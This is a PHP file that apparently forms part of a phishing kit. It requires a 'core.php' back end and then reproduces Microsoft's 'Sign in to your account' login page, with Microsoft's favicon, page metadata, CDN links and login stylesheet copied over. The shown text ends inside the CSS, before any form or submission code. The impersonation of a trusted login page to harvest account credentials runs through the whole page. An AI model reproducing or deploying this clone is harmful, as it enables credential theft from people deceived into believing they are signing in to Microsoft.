<?php
require_once("core.php");
?>
<!DOCTYPE html>
<html dir="ltr" class="js-focus-visible" lang="en" data-js-focus-visible="">

<head>
    <link rel="icon" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <link rel="preconnect" href="https://aadcdn.msftauth.net" crossorigin="">
    <meta http-equiv="x-dns-prefetch-control" content="on">
    <link rel="dns-prefetch" href="//aadcdn.msftauth.net">
    <link rel="dns-prefetch" href="//aadcdn.msauth.net">

    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">


    <noscript>
        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
    </noscript>



    <meta name="robots" content="none">

    <script type="text/javascript"></script>
    <script type="text/javascript"></script>

    <link rel="prefetch" href="https://login.live.com/Me.htm?v=3">
    <link rel="shortcut icon" data-savepage-href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.js" type="text/javascript"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/additional-methods.js" type="text/javascript"></script>


    <style data-savepage-href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_59_uuouser7hrkmvbaz1jw2.css">
        /*! Copyright (C) Microsoft Corporation. All rights reserved. */
        /*!
------------------------------------------- START OF THIRD PARTY NOTICE -----------------------------------------

This file is based on or incorporates material from the projects listed below (Third Party IP). The original copyright notice and the license under which Microsoft received such Third Party IP, are set forth below. Such licenses and notices are provided for informational purposes only. Microsoft licenses the Third Party IP to you under the licensing terms for the Microsoft product. Microsoft reserves all other rights not expressly granted under this agreement, whether by implication, estoppel or otherwise.

//-----------------------------------------------------------------------------
twbs-bootstrap-sass (3.3.0)
//-----------------------------------------------------------------------------

The MIT License (MIT)

Copyright (c) 2013 Twitter, Inc

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

//-----------------------------------------------------------------------------
necolas-normalize.css (3.0.2)
//-----------------------------------------------------------------------------
! normalize.css v3.0.2 | MIT License | git.io/normalize

Copyright (c) Nicolas Gallagher and Jonathan Neal

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

Provided for Informational Purposes Only
MIT License
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the Software), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
        /*! normalize.css v3.0.2 | MIT License | git.io/normalize */
        html {
            font-family: sans-serif;
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%
        }

        body {
            margin: 0
        }

        article,
        aside,
        details,
        figcaption,
        figure,
        footer,
        header,
        hgroup,
        main,
        menu,
        nav,
        section,
        summary {
            display: block
        }

        audio,
        canvas,
        progress,
        video {
            display: inline-block;
            vertical-align: baseline
        }

        audio:not([controls]) {
            display: none;
            height: 0
        }

        [hidden],
        template {
            display: none
        }

        a {
            background-color: transparent
        }

        a:active,
        a:hover {
            outline: 0
        }

        abbr[title] {
            border-bottom: 1px dotted
        }

        b,
        strong {
            font-weight: bold
        }

        dfn {
            font-style: italic
        }

        h1 {
            font-size: 2em;
            margin: .67em 0
        }

        mark {
            background: #ff0;
            color: #000
        }

        small {
            font-size: 80%
        }

        sub,
        sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: baseline
        }

        sup {
            top: -0.5em
        }

        sub {
            bottom: -0.25em
        }

        img {
            border: 0
        }

        svg:not(:root) {
            overflow: hidden
        }

        figure {
            margin: 1em 40px
        }

        hr {
            -moz-box-sizing: content-box;
            box-sizing: content-box;
            height: 0
        }

        pre {
            overflow: auto
        }

        code,
        kbd,
        pre,
        samp {
            font-family: monospace, monospace;
            font-size: 1em
        }

        button,
        input,
        optgroup,
        select,
        textarea {
            color: inherit;
            font: inherit;
            margin: 0
        }

        button {
            overflow: visible
        }

        button,
        select {
            text-transform: none
        }

        button,
        html input[type="button"],
        input[type="reset"],
        input[type="submit"] {
            -webkit-appearance: button;
            cursor: pointer
        }

        button[disabled],
        html input[disabled] {
            cursor: default
        }

        button::-moz-focus-inner,
        input::-moz-focus-inner {
            border: 0;
            padding: 0
        }

        input {
            line-height: normal
        }

        input[type="checkbox"],
        input[type="radio"] {
            box-sizing: border-box;
            padding: 0
        }

        input[type="number"]::-webkit-inner-spin-button,
        input[type="number"]::-webkit-outer-spin-button {
            height: auto
        }

        input[type="search"] {
            -webkit-appearance: textfield;
            -moz-box-sizing: content-box;
            -webkit-box-sizing: content-box;
            box-sizing: content-box
        }

        input[type="search"]::-webkit-search-cancel-button,
        input[type="search"]::-webkit-search-decoration {
            -webkit-appearance: none
        }

        fieldset {
            border: 1px solid #c0c0c0;
            margin: 0 2px;
            padding: .35em .625em .75em
        }

        legend {
            border: 0;
            padding: 0
        }

        textarea {
            overflow: auto
        }

        optgroup {
            font-weight: bold
        }

        table {
            border-collapse: collapse;
            border-spacing: 0
        }

        td,
        th {
            padding: 0
        }

        * {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box
        }

        *:before,
        *:after {
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box
        }

        input,
        button,
        select,
        textarea {
            font-family: inherit;
            font-size: inherit;
            line-height: inherit
        }

        a:focus {
            outline: thin dotted;
            outline: 5px auto -webkit-focus-ring-color;
            outline-offset: -2px
        }

        figure {
            margin: 0
        }

        img {
            vertical-align: middle
        }

        .img-responsive {
            display: block;
            max-width: 100%;
            height: auto
        }

        .img-circle {
            border-radius: 50%
        }

        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            margin: -1px;
            padding: 0;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0
        }

        .sr-only-focusable:active,
        .sr-only-focusable:focus {
            position: static;
            width: auto;
            height: auto;
            margin: 0;
            overflow: visible;
            clip: auto
        }

        html {
            font-size: 100%
        }

        body {
            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
            font-size: 15px;
            line-height: 20px;
            font-weight: 400;
            font-size: .9375rem;
            line-height: 1.25rem;
            padding-bottom: .227px;
            padding-top: .227px;
            color: #000;
            background-color: #fff
        }

        a {
            color: #ccc;
            text-decoration: none
        }

        a:link {
            color: #0067b8
        }

        a:visited {
            color: #0067b8
        }

        a:hover {
            color: #666
        }

        a:focus {
            color: #0067b8
        }

        a:active {
            color: #999
        }

        .text-center {
            text-align: center
        }

        .text-justify {
            text-align: justify
        }

        .text-nowrap {
            white-space: nowrap
        }

        .text-lowercase {
            text-transform: lowercase
        }

        .text-uppercase {
            text-transform: uppercase
        }

        .text-capitalize {
            text-transform: capitalize
        }

        ul,
        ol {
            margin-top: 0;
            margin-bottom: 10px
        }

        ul ul,
        ul ol,
        ol ul,
        ol ol {
            margin-bottom: 0
        }

        abbr[title],
        abbr[data-original-title] {
            cursor: help
        }

        blockquote p:last-child,
        blockquote ul:last-child,
        blockquote ol:last-child {
            margin-bottom: 0
        }

        blockquote footer,
        blockquote small,
        blockquote .small {
            display: block
        }

        address {
            font-style: normal
        }

        @font-face {
            font-family: 'Segoe UI Webfont';
            src: local("Segoe UI Light");
            font-weight: 200;
            font-style: normal
        }

        @font-face {
            font-family: 'Segoe UI Webfont';
            src: local("Segoe UI");
            font-weight: 400;
            font-style: normal
        }

        @font-face {
            font-family: 'Segoe UI Webfont';
            src: local("Segoe UI Semibold");
            font-weight: 600;
            font-style: normal
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        .text-headline,
        .text-header,
        .text-subheader,
        .text-title,
        .text-subtitle,
        .text-body,
        .text-base,
        .text-caption,
        .text-caption-alt,
        .text-subcaption,
        p {
            margin-bottom: 20px;
            margin-top: 20px;
            margin-bottom: 1.25rem;
            margin-top: 1.25rem
        }

        .text-headline {
            font-size: 62px;
            line-height: 80px;
            font-weight: 200;
            font-size: 3.875rem;
            line-height: 5rem;
            padding-bottom: 2.2716px;
            padding-top: 2.2716px
        }

        .text-headline.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 84.5432px;
            max-height: 5.28395rem
        }

        .text-headline.text-maxlines-2 {
            max-height: 164.5432px;
            max-height: 10.28395rem
        }

        .text-headline.text-maxlines-3 {
            max-height: 244.5432px;
            max-height: 15.28395rem
        }

        .text-headline.text-maxlines-4 {
            max-height: 324.5432px;
            max-height: 20.28395rem
        }

        .text-header,
        h1 {
            font-size: 46px;
            line-height: 56px;
            font-weight: 200;
            font-size: 2.875rem;
            line-height: 3.5rem;
            padding-bottom: 3.3628px;
            padding-top: 3.3628px
        }

        .text-header.text-maxlines-1,
        h1.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 62.7256px;
            max-height: 3.92035rem
        }

        .text-header.text-maxlines-2,
        h1.text-maxlines-2 {
            max-height: 118.7256px;
            max-height: 7.42035rem
        }

        .text-header.text-maxlines-3,
        h1.text-maxlines-3 {
            max-height: 174.7256px;
            max-height: 10.92035rem
        }

        .text-header.text-maxlines-4,
        h1.text-maxlines-4 {
            max-height: 230.7256px;
            max-height: 14.42035rem
        }

        .text-subheader,
        h2 {
            font-size: 34px;
            line-height: 40px;
            font-weight: 200;
            font-size: 2.125rem;
            line-height: 2.5rem;
            padding-bottom: 3.1812px;
            padding-top: 3.1812px
        }

        .text-subheader.text-maxlines-1,
        h2.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 46.3624px;
            max-height: 2.89765rem
        }

        .text-subheader.text-maxlines-2,
        h2.text-maxlines-2 {
            max-height: 86.3624px;
            max-height: 5.39765rem
        }

        .text-subheader.text-maxlines-3,
        h2.text-maxlines-3 {
            max-height: 126.3624px;
            max-height: 7.89765rem
        }

        .text-subheader.text-maxlines-4,
        h2.text-maxlines-4 {
            max-height: 166.3624px;
            max-height: 10.39765rem
        }

        .text-title,
        h3 {
            font-size: 24px;
            line-height: 28px;
            font-weight: 300;
            font-size: 1.5rem;
            line-height: 1.75rem;
            padding-bottom: 2.3632px;
            padding-top: 2.3632px
        }

        .text-title.text-maxlines-1,
        h3.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 32.7264px;
            max-height: 2.0454rem
        }

        .text-title.text-maxlines-2,
        h3.text-maxlines-2 {
            max-height: 60.7264px;
            max-height: 3.7954rem
        }

        .text-title.text-maxlines-3,
        h3.text-maxlines-3 {
            max-height: 88.7264px;
            max-height: 5.5454rem
        }

        .text-title.text-maxlines-4,
        h3.text-maxlines-4 {
            max-height: 116.7264px;
            max-height: 7.2954rem
        }

        .text-subtitle,
        h4 {
            font-size: 20px;
            line-height: 24px;
            font-weight: 400;
            font-size: 1.25rem;
            line-height: 1.5rem;
            padding-bottom: 1.636px;
            padding-top: 1.636px
        }

        .text-subtitle.text-maxlines-1,
        h4.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 27.272px;
            max-height: 1.7045rem
        }

        .text-subtitle.text-maxlines-2,
        h4.text-maxlines-2 {
            max-height: 51.272px;
            max-height: 3.2045rem
        }

        .text-subtitle.text-maxlines-3,
        h4.text-maxlines-3 {
            max-height: 75.272px;
            max-height: 4.7045rem
        }

        .text-subtitle.text-maxlines-4,
        h4.text-maxlines-4 {
            max-height: 99.272px;
            max-height: 6.2045rem
        }

        .text-caption,
        h5 {
            font-size: 12px;
            line-height: 14px;
            font-weight: 400;
            font-size: .75rem;
            line-height: .875rem;
            padding-bottom: 1.1816px;
            padding-top: 1.1816px
        }

        .text-caption.text-maxlines-1,
        h5.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 16.3632px;
            max-height: 1.0227rem
        }

        .text-caption.text-maxlines-2,
        h5.text-maxlines-2 {
            max-height: 30.3632px;
            max-height: 1.8977rem
        }

        .text-caption.text-maxlines-3,
        h5.text-maxlines-3 {
            max-height: 44.3632px;
            max-height: 2.7727rem
        }

        .text-caption.text-maxlines-4,
        h5.text-maxlines-4 {
            max-height: 58.3632px;
            max-height: 3.6477rem
        }

        .text-caption-alt,
        h6 {
            font-size: 10px;
            line-height: 12px;
            font-weight: 400;
            font-size: .625rem;
            line-height: .75rem;
            padding-bottom: .818px;
            padding-top: .818px
        }

        .text-caption-alt.text-maxlines-1,
        h6.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 13.636px;
            max-height: .85225rem
        }

        .text-caption-alt.text-maxlines-2,
        h6.text-maxlines-2 {
            max-height: 25.636px;
            max-height: 1.60225rem
        }

        .text-caption-alt.text-maxlines-3,
        h6.text-maxlines-3 {
            max-height: 37.636px;
            max-height: 2.35225rem
        }

        .text-caption-alt.text-maxlines-4,
        h6.text-maxlines-4 {
            max-height: 49.636px;
            max-height: 3.10225rem
        }

        .text-subcaption {
            font-size: 8px;
            line-height: 10px;
            font-weight: 400;
            font-size: .5rem;
            line-height: .625rem;
            padding-bottom: .4544px;
            padding-top: .4544px
        }

        .text-subcaption.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 10.9088px;
            max-height: .6818rem
        }

        .text-subcaption.text-maxlines-2 {
            max-height: 20.9088px;
            max-height: 1.3068rem
        }

        .text-subcaption.text-maxlines-3 {
            max-height: 30.9088px;
            max-height: 1.9318rem
        }

        .text-subcaption.text-maxlines-4 {
            max-height: 40.9088px;
            max-height: 2.5568rem
        }

        .text-body,
        p {
            font-size: 15px;
            line-height: 20px;
            font-weight: 400;
            font-size: .9375rem;
            line-height: 1.25rem;
            padding-bottom: .227px;
            padding-top: .227px
        }

        .text-body.text-maxlines-1,
        p.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 20.454px;
            max-height: 1.27838rem
        }

        .text-body.text-maxlines-2,
        p.text-maxlines-2 {
            max-height: 40.454px;
            max-height: 2.52838rem
        }

        .text-body.text-maxlines-3,
        p.text-maxlines-3 {
            max-height: 60.454px;
            max-height: 3.77838rem
        }

        .text-body.text-maxlines-4,
        p.text-maxlines-4 {
            max-height: 80.454px;
            max-height: 5.02838rem
        }

        .text-base {
            font-size: 15px;
            line-height: 20px;
            font-weight: 600;
            font-size: .9375rem;
            line-height: 1.25rem;
            padding-bottom: .227px;
            padding-top: .227px
        }

        .text-base.text-maxlines-1 {
            white-space: nowrap;
            text-overflow: ellipsis;
            max-height: 20.454px;
            max-height: 1.27838rem
        }

        .text-base.text-maxlines-2 {
            max-height: 40.454px;
            max-height: 2.52838rem
        }

        .text-base.text-maxlines-3 {
            max-height: 60.454px;
            max-height: 3.77838rem
        }

        .text-base.text-maxlines-4 {
            max-height: 80.454px;
            max-height: 5.02838rem
        }

        [class*="text-maxlines"] {
            overflow: hidden
        }

        .text-left {
            text-align: left
        }

        .text-right {
            text-align: right
        }

        .list-unstyled {
            padding-left: 0;
            list-style: none
        }

        ul {
            padding-left: 0;
            list-style: none
        }

        ul,
        ol {
            margin-top: 20px;
            margin-bottom: 20px
        }

        ul li,
        ol li {
            margin-top: 12px;
            margin-bottom: 12px
        }

        .list-inline {
            padding-left: 0;
            list-style: none;
            margin-left: -4px
        }

        .list-inline>li {
            display: inline-block;
            padding-left: 4px;
            padding-right: 4px
        }

        blockquote {
            padding: 8px 12px;
            margin: 0 0 12px
        }

        .blockquote-reverse,
        blockquote.pull-right {
            padding-right: 12px;
            padding-left: 0;
            text-align: right
        }

        address {
            margin-bottom: 12px
        }

        .container,
        .container-fluid {
            margin-right: auto;
            margin-left: auto;
            padding-left: 2px;
            padding-right: 2px;
            width: 90%
        }

        .container:before,
        .container:after,
        .container-fluid:before,
        .container-fluid:after {
            content: " ";
            display: table
        }

        .container:after,
        .container-fluid:after {
            clear: both
        }

        .container .container,
        .container-fluid .container {
            width: auto
        }

        .row {
            margin-left: -2px;
            margin-right: -2px
        }

        .row:before,
        .row:after {
            content: " ";
            display: table
        }

        .row:after {
            clear: both
        }

        .col-xs-1,
        .col-sm-1,
        .col-md-1,
        .col-lg-1,
        .col-xs-2,
        .col-sm-2,
        .col-md-2,
        .col-lg-2,
        .col-xs-3,
        .col-sm-3,
        .col-md-3,
        .col-lg-3,
        .col-xs-4,
        .col-sm-4,
        .col-md-4,
        .col-lg-4,
        .col-xs-5,
        .col-sm-5,
        .col-md-5,
        .col-lg-5,
        .col-xs-6,
        .col-sm-6,
        .col-md-6,
        .col-lg-6,
        .col-xs-7,
        .col-sm-7,
        .col-md-7,
        .col-lg-7,
        .col-xs-8,
        .col-sm-8,
        .col-md-8,
        .col-lg-8,
        .col-xs-9,
        .col-sm-9,
        .col-md-9,
        .col-lg-9,
        .col-xs-10,
        .col-sm-10,
        .col-md-10,
        .col-lg-10,
        .col-xs-11,
        .col-sm-11,
        .col-md-11,
        .col-lg-11,
        .col-xs-12,
        .col-sm-12,
        .col-md-12,
        .col-lg-12,
        .col-xs-13,
        .col-sm-13,
        .col-md-13,
        .col-lg-13,
        .col-xs-14,
        .col-sm-14,
        .col-md-14,
        .col-lg-14,
        .col-xs-15,
        .col-sm-15,
        .col-md-15,
        .col-lg-15,
        .col-xs-16,
        .col-sm-16,
        .col-md-16,
        .col-lg-16,
        .col-xs-17,
        .col-sm-17,
        .col-md-17,
        .col-lg-17,
        .col-xs-18,
        .col-sm-18,
        .col-md-18,
        .col-lg-18,
        .col-xs-19,
        .col-sm-19,
        .col-md-19,
        .col-lg-19,
        .col-xs-20,
        .col-sm-20,
        .col-md-20,
        .col-lg-20,
        .col-xs-21,
        .col-sm-21,
        .col-md-21,
        .col-lg-21,
        .col-xs-22,
        .col-sm-22,
        .col-md-22,
        .col-lg-22,
        .col-xs-23,
        .col-sm-23,
        .col-md-23,
        .col-lg-23,
        .col-xs-24,
        .col-sm-24,
        .col-md-24,
        .col-lg-24 {
            position: relative;
            min-height: 1px;
            padding-left: 2px;
            padding-right: 2px
        }

        .col-xs-1,
        .col-xs-2,
        .col-xs-3,
        .col-xs-4,
        .col-xs-5,
        .col-xs-6,
        .col-xs-7,
        .col-xs-8,
        .col-xs-9,
        .col-xs-10,
        .col-xs-11,
        .col-xs-12,
        .col-xs-13,
        .col-xs-14,
        .col-xs-15,
        .col-xs-16,
        .col-xs-17,
        .col-xs-18,
        .col-xs-19,
        .col-xs-20,
        .col-xs-21,
        .col-xs-22,
        .col-xs-23,
        .col-xs-24 {
            float: left
        }

        .col-xs-1 {
            width: 4.16667%
        }

        .col-xs-2 {
            width: 8.33333%
        }

        .col-xs-3 {
            width: 12.5%
        }

        .col-xs-4 {
            width: 16.66667%
        }

        .col-xs-5 {
            width: 20.83333%
        }

        .col-xs-6 {
            width: 25%
        }

        .col-xs-7 {
            width: 29.16667%
        }

        .col-xs-8 {
            width: 33.33333%
        }

        .col-xs-9 {
            width: 37.5%
        }

        .col-xs-10 {
            width: 41.66667%
        }

        .col-xs-11 {
            width: 45.83333%
        }

        .col-xs-12 {
            width: 50%
        }

        .col-xs-13 {
            width: 54.16667%
        }

        .col-xs-14 {
            width: 58.33333%
        }

        .col-xs-15 {
            width: 62.5%
        }

        .col-xs-16 {
            width: 66.66667%
        }

        .col-xs-17 {
            width: 70.83333%
        }

        .col-xs-18 {
            width: 75%
        }

        .col-xs-19 {
            width: 79.16667%
        }

        .col-xs-20 {
            width: 83.33333%
        }

        .col-xs-21 {
            width: 87.5%
        }

        .col-xs-22 {
            width: 91.66667%
        }

        .col-xs-23 {
            width: 95.83333%
        }

        .col-xs-24 {
            width: 100%
        }

        .col-xs-pull-0 {
            right: auto
        }

        .col-xs-pull-1 {
            right: 4.16667%
        }

        .col-xs-pull-2 {
            right: 8.33333%
        }

        .col-xs-pull-3 {
            right: 12.5%
        }

        .col-xs-pull-4 {
            right: 16.66667%
        }

        .col-xs-pull-5 {
            right: 20.83333%
        }

        .col-xs-pull-6 {
            right: 25%
        }

        .col-xs-pull-7 {
            right: 29.16667%
        }

        .col-xs-pull-8 {
            right: 33.33333%
        }

        .col-xs-pull-9 {
            right: 37.5%
        }

        .col-xs-pull-10 {
            right: 41.66667%
        }

        .col-xs-pull-11 {
            right: 45.83333%
        }

        .col-xs-pull-12 {
            right: 50%
        }

        .col-xs-pull-13 {
            right: 54.16667%
        }

        .col-xs-pull-14 {
            right: 58.33333%
        }

        .col-xs-pull-15 {
            right: 62.5%
        }

        .col-xs-pull-16 {
            right: 66.66667%
        }

        .col-xs-pull-17 {
            right: 70.83333%
        }

        .col-xs-pull-18 {
            right: 75%
        }

        .col-xs-pull-19 {
            right: 79.16667%
        }

        .col-xs-pull-20 {
            right: 83.33333%
        }

        .col-xs-pull-21 {
            right: 87.5%
        }

        .col-xs-pull-22 {
            right: 91.66667%
        }

        .col-xs-pull-23 {
            right: 95.83333%
        }

        .col-xs-pull-24 {
            right: 100%
        }

        .col-xs-push-0 {
            left: auto
        }

        .col-xs-push-1 {
            left: 4.16667%
        }

        .col-xs-push-2 {
            left: 8.33333%
        }

        .col-xs-push-3 {
            left: 12.5%
        }

        .col-xs-push-4 {
            left: 16.66667%
        }

        .col-xs-push-5 {
            left: 20.83333%
        }

        .col-xs-push-6 {
            left: 25%
        }

        .col-xs-push-7 {
            left: 29.16667%
        }

        .col-xs-push-8 {
            left: 33.33333%
        }

        .col-xs-push-9 {
            left: 37.5%
        }

        .col-xs-push-10 {
            left: 41.66667%
        }

        .col-xs-push-11 {
            left: 45.83333%
        }

        .col-xs-push-12 {
            left: 50%
        }

        .col-xs-push-13 {
            left: 54.16667%
        }

        .col-xs-push-14 {
            left: 58.33333%
        }

        .col-xs-push-15 {
            left: 62.5%
        }

        .col-xs-push-16 {
            left: 66.66667%
        }

        .col-xs-push-17 {
            left: 70.83333%
        }

        .col-xs-push-18 {
            left: 75%
        }

        .col-xs-push-19 {
            left: 79.16667%
        }

        .col-xs-push-20 {
            left: 83.33333%
        }

        .col-xs-push-21 {
            left: 87.5%
        }

        .col-xs-push-22 {
            left: 91.66667%
        }

        .col-xs-push-23 {
            left: 95.83333%
        }

        .col-xs-push-24 {
            left: 100%
        }

        .col-xs-offset-0 {
            margin-left: 0
        }

        .col-xs-offset-1 {
            margin-left: 4.16667%
        }

        .col-xs-offset-2 {
            margin-left: 8.33333%
        }

        .col-xs-offset-3 {
            margin-left: 12.5%
        }

        .col-xs-offset-4 {
            margin-left: 16.66667%
        }

        .col-xs-offset-5 {
            margin-left: 20.83333%
        }

        .col-xs-offset-6 {
            margin-left: 25%
        }

        .col-xs-offset-7 {
            margin-left: 29.16667%
        }

        .col-xs-offset-8 {
            margin-left: 33.33333%
        }

        .col-xs-offset-9 {
            margin-left: 37.5%
        }

        .col-xs-offset-10 {
            margin-left: 41.66667%
        }

        .col-xs-offset-11 {
            margin-left: 45.83333%
        }

        .col-xs-offset-12 {
            margin-left: 50%
        }

        .col-xs-offset-13 {
            margin-left: 54.16667%
        }

        .col-xs-offset-14 {
            margin-left: 58.33333%
        }

        .col-xs-offset-15 {
            margin-left: 62.5%
        }

        .col-xs-offset-16 {
            margin-left: 66.66667%
        }

        .col-xs-offset-17 {
            margin-left: 70.83333%
        }

        .col-xs-offset-18 {
            margin-left: 75%
        }

        .col-xs-offset-19 {
            margin-left: 79.16667%
        }

        .col-xs-offset-20 {
            margin-left: 83.33333%
        }

        .col-xs-offset-21 {
            margin-left: 87.5%
        }

        .col-xs-offset-22 {
            margin-left: 91.66667%
        }

        .col-xs-offset-23 {
            margin-left: 95.83333%
        }

        .col-xs-offset-24 {
            margin-left: 100%
        }

        @media (min-width:540px) {

            .col-sm-1,
            .col-sm-2,
            .col-sm-3,
            .col-sm-4,
            .col-sm-5,
            .col-sm-6,
            .col-sm-7,
            .col-sm-8,
            .col-sm-9,
            .col-sm-10,
            .col-sm-11,
            .col-sm-12,
            .col-sm-13,
            .col-sm-14,
            .col-sm-15,
            .col-sm-16,
            .col-sm-17,
            .col-sm-18,
            .col-sm-19,
            .col-sm-20,
            .col-sm-21,
            .col-sm-22,
            .col-sm-23,
            .col-sm-24 {
                float: left
            }

            .col-sm-1 {
                width: 4.16667%
            }

            .col-sm-2 {
                width: 8.33333%
            }

            .col-sm-3 {
                width: 12.5%
            }

            .col-sm-4 {
                width: 16.66667%
            }

            .col-sm-5 {
                width: 20.83333%
            }

            .col-sm-6 {
                width: 25%
            }

            .col-sm-7 {
                width: 29.16667%
            }

            .col-sm-8 {
                width: 33.33333%
            }

            .col-sm-9 {
                width: 37.5%
            }

            .col-sm-10 {
                width: 41.66667%
            }

            .col-sm-11 {
                width: 45.83333%
            }

            .col-sm-12 {
                width: 50%
            }

            .col-sm-13 {
                width: 54.16667%
            }

            .col-sm-14 {
                width: 58.33333%
            }

            .col-sm-15 {
                width: 62.5%
            }

            .col-sm-16 {
                width: 66.66667%
            }

            .col-sm-17 {
                width: 70.83333%
            }

            .col-sm-18 {
                width: 75%
            }

            .col-sm-19 {
                width: 79.16667%
            }

            .col-sm-20 {
                width: 83.33333%
            }

            .col-sm-21 {
                width: 87.5%
            }

            .col-sm-22 {
                width: 91.66667%
            }

            .col-sm-23 {
                width: 95.83333%
            }

            .col-sm-24 {
                width: 100%
            }

            .col-sm-pull-0 {
                right: auto
            }

            .col-sm-pull-1 {
                right: 4.16667%
            }

            .col-sm-pull-2 {
                right: 8.33333%
            }

            .col-sm-pull-3 {
                right: 12.5%
            }

            .col-sm-pull-4 {
                right: 16.66667%
            }

            .col-sm-pull-5 {
                right: 20.83333%
            }

            .col-sm-pull-6 {
                right: 25%
            }

            .col-sm-pull-7 {
                right: 29.16667%
            }

            .col-sm-pull-8 {
                right: 33.33333%
            }

            .col-sm-pull-9 {
                right: 37.5%
            }

            .col-sm-pull-10 {
                right: 41.66667%
            }

            .col-sm-pull-11 {
                right: 45.83333%
            }

            .col-sm-pull-12 {
                right: 50%
            }

            .col-sm-pull-13 {
                right: 54.16667%
            }

            .col-sm-pull-14 {
                right: 58.33333%
            }

